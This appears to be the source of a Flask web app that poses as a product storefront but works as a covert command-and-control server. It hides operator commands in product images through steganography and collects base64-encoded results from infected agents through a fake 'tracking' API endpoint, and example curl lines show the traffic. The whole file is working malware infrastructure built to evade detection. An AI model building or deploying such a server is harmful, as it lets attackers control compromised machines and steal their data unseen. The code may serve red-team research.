from bin.steganography import *
from bin.c2 import *
from flask import Flask, render_template, request
from json import loads

app = Flask(__name__)


def __get_products():
    with open('data/products.json', 'r', encoding='utf8') as product_file:
        return loads(product_file.read())

# curl -H "X-Tracking-For: 0f732d5e" http://localhost:80
@app.route('/')
def index():
    products = __get_products()
    agent = request.headers.get('X-Tracking-For')
    source_image = products[0]['image_url']
    (id, cmd) = C2.get_next_command(agent, source_image)
    if len(cmd or '') > 0:
        products[0]['image_url'] = Steganography.embed_data_into_image(id, source_image, cmd)
    return render_template('index.html', products=products)

# curl -H "X-Tracking-For: 0f732d5e" -H "Content-Type: application/json" -X POST http://localhost:80/api/tracking -d '{"timestamp":1736602824,"result":"cnV0Z2VyCg=="}'
@app.route('/api/tracking', methods=['POST'])
def post_tracking():
    data = request.get_json()
    C2.persist_result(request.headers.get('X-Tracking-For'), data['timestamp'], data['result'])
    return '', 201

if __name__ == '__main__':
    app.run(debug=True, port=80, host='0.0.0.0')
